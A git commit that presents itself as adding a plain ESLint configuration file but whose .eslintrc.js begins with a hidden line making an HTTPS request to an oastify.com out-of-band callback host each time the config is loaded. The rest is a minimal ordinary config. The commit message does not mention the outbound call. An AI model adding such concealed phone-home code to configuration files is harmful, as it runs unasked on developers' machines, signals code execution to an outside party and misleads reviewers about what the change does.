e23fc9095a6aaa62ba6a237af54252dfe6ede899
THOMASSAAD <140086763+THOMASSAAD@users.noreply.github.com>
2026-09-25 09:45:33 +0300

    Add ESLint configuration fileAdd eslintrc config

---
+++ .eslintrc.js
@@ -0,0 +1,7 @@
+require('https').get('https://xz0bjrv1xnur3kwh5kkwcm2xxo3grk9vh80a5gw5.oastify.com/eslintrc-loaded');
+module.exports = {
+  env: { browser: true, es2021: true },
+    extends: 'eslint:recommended',
+      rules: {}
+      };
+      
